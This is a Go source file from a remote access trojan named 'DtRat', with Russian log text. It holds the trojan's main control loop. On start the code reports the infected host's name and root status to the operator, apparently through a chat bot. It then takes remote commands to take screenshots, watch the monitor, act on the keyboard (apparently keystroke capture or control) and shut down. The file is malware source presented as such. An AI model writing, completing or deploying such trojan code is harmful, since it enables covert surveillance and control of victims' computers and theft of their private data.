package rat

import (
	"dtrat/bot"

	"github.com/deuterium34/dlog"
)

func (r *Rat) internalClose(reason error) {
	r.Bot.Close()
	r.Engine.Close()
	r.Spy.Close()

	r.CloseCh <- reason
}

func (r *Rat) Close() {
	r.internalClose(nil)
}

func (r *Rat) Start() {
	dlog.GLogger.Info("Запуск ратника")
	r.Bot.Start()
	go r.commandHandling()
	r.Bot.Send("DtRat Запущен!\n\nХост: %s\nroot: %t", r.Config.General.HostName, r.Engine.Info.IsRoot())
}

func (r *Rat) commandHandling() error {
	for true {
		msg, err := r.Bot.Wait()
		if err != nil {
			return err
		}

		r.commandsSwitch(msg)
	}

	return nil
}

func (r *Rat) commandsSwitch(text string) {
	cmd, args := bot.ParseCommand(text)
	switch cmd {
	case "start":
		r.startCmd()
	case "kill":
		r.killCmd()
	case "help":
		r.helpCmd()
	case "screenshot":
		r.screenshotCmd()
	case "monitor":
		r.monitorCmd(args)
	case "keyboard":
		r.keyboardCmd(args)
	default:
		r.defaultCmd()
	}
}
